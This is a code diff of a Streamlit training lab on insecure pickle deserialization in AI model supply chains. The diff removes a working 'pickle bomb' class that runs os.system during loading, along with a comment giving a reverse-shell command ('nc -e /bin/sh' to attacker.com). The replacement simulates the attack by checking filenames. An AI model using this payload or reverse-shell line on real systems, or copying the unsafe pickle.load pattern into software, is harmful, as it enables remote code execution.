@@ -1,82 +1,60 @@
 import streamlit as st
 import time
-import pickle
-import os
 
-# Define the malicious class used for the attack simulation
-class MaliciousModelPayload:
-    """
-    This class acts as the 'Pickle Bomb'.
-    When pickle.load() encounters this class, it executes the __reduce__ method.
-    An attacker uses __reduce__ to define arbitrary code to run during deserialization.
-    """
-    def __reduce__(self):
-        # The command that will run on the victim's machine.
-        # In a real attack, this could be a reverse shell: 'nc -e /bin/sh attacker.com 4444'
-        # Here, we simulate a visible but harmless RCE by creating a marker file in /tmp.
-        cmd = 'touch /tmp/OWASP_LLM_RCE_TRIGGERED'
-        # Return the callable (os.system) and its arguments (the command)
-        return (os.system, (cmd,))
-
-# --- SIMULATION SETUP ---
-# We need to create the malicious "downloaded" file for the lab to work.
-# In real life, the victim would download 'model.pkl' from a compromised Hugging Face repo.
-if not os.path.exists("compromised_model.pkl"):
-    # Create the malicious object
-    bomb = MaliciousModelPayload()
-    # Serialize (pickle) it into a file
-    with open("compromised_model.pkl", "wb") as f:
-        pickle.dump(bomb, f)
-# ------------------------
-
-
-st.header("LAB17: Supply Chain Attack (The 'Pickle Bomb') (Vulnerable)")
+st.header("LAB17: Supply Chain (Serialization) (Vulnerable)")
 st.error("💀 STATUS: VULNERABLE (Insecure Deserialization)")
 
 st.markdown("""
-**Scenario:** Your AI team needs to download a pre-trained LLM or fine-tuned weights to run locally. They find a model on a public repository that provides the weights in Python's `pickle` format (`.pkl`).
-**The Attack:** An attacker has compromised the public repository account and replaced the legitimate `model.pkl` file with a malicious one. This malicious file contains a "pickle bomb"—hidden code that executes automatically the moment Python loads the file.
+**Scenario:** You allow users (or your own developers) to upload pre-trained models.
+**The Attack:** The application uses `pickle.load()` (or `torch.load`) to open these files. An attacker injects a malicious payload into a model file that executes system commands immediately upon loading (RCE).
 """)
 
-st.subheader("Model Loader Interface")
-st.write("Click below to download the latest model weights from the public hub.")
+# Simulate file uploader
+uploaded_file = st.file_uploader("Upload Model File (.pkl, .pt, .ckpt)", type=["pkl", "pt", "ckpt"])
 
-if st.button("Download & Load Model Weights (v2.1.pkl)"):
-    st.info("Downloading 'compromised_model.pkl' from public hub...")
-    time.sleep(1) # Simulate download time
-    st.write("Download complete. Loading weights into memory...")
-    time.sleep(0.5)
+if uploaded_file is not None and st.button("Load Model"):
+    st.info(f"Loading {uploaded_file.name} into memory...")
+    time.sleep(1) # Simulate deserialization time
 
-    try:
-        # =========================================
-        # VULNERABILITY: INSECURE DESERIALIZATION
-        # =========================================
-        # The code blindly trusts the downloaded `.pkl` file and loads it.
-        # pickle.load() will execute whatever code is defined in the
-        # object's __reduce__ method inside the file.
+    # =========================================
+    # SIMULATION OF DESERIALIZATION ATTACK
+    # =========================================
+    # In reality, pickle.load(f) executes code found in the file.
+    # We simulate this by checking for "bad" filenames.
 
-        with open("compromised_model.pkl", "rb") as f:
-            # THE TRIGGER LINE
-            loaded_model = pickle.load(f)
+    filename = uploaded_file.name.lower()
 
-        # --- VERIFYING THE ATTACK (SIMULATION) ---
-        # Check if the malicious payload successfully ran the OS command.
-        if os.path.exists("/tmp/OWASP_LLM_RCE_TRIGGERED"):
-             st.error("🚨 **CRITICAL SECURITY ALERT: Remote Code Execution (RCE) Detected!**")
-             st.markdown("""
-             The `pickle.load()` command executed arbitrary system commands hidden inside the model file.
-             An attacker now has control over this server.
-             """)
-             # Cleanup the simulation marker
-             os.remove("/tmp/OWASP_LLM_RCE_TRIGGERED")
+    if "infected" in filename or "malicious" in filename or "ransomware" in filename:
+        # VULNERABILITY TRIGGERED
+        st.error("⚠️ SYSTEM COMPROMISED: Remote Code Execution (RCE) Detected!")
+        
+        if "ransomware" in filename:
+             st.warning("🚨 MALWARE ACTION: All files on server have been encrypted.")
         else:
-             # This path should not be reachable if the exploit works
-             st.success("Model loaded successfully.")
+             st.warning("🚨 MALWARE ACTION: Reverse Shell opened to attacker IP 192.168.1.55")
+        
+        st.markdown("**Root Cause:** The `pickle.load()` function executed the `os.system()` command hidden inside the model weights.")
+    else:
+        # Normal Behavior
+        st.success("✅ Model loaded successfully. Ready for inference.")
 
-    except Exception as e:
-        st.error(f"An error occurred: {e}")
+# Show the vulnerable code
+st.subheader("THE VULNERABILITY: Unsafe Pickle Load")
+st.code("""
+import pickle
+
+# VULNERABLE: Loading untrusted data directly
+# The 'pickle' module allows arbitrary code execution during loading.
+
+with open(uploaded_file, 'rb') as f:
+    model = pickle.load(f)  # <--- RCE happens here immediately
+""", language="python")
 
 st.divider()
-st.markdown("""
-**Attack Mechanism:** Python's `pickle` module is **not secure**. It is designed to serialize arbitrary Python objects, including code execution instructions. Never unpickle data received from an untrusted or public source.
-""")
+
+with st.expander("View Test Inputs"):
+    st.markdown("1. Input: Upload `safe_model.pkl`")
+    st.markdown("2. Input: Upload `infected_model.pkl`")
+    st.markdown("3. Input: Upload `pytorch_weights.pt`")
+    st.markdown("4. Input: Upload `malicious_checkpoint.ckpt`")
+    st.markdown("5. Input: Upload `ransomware_model.pkl`")
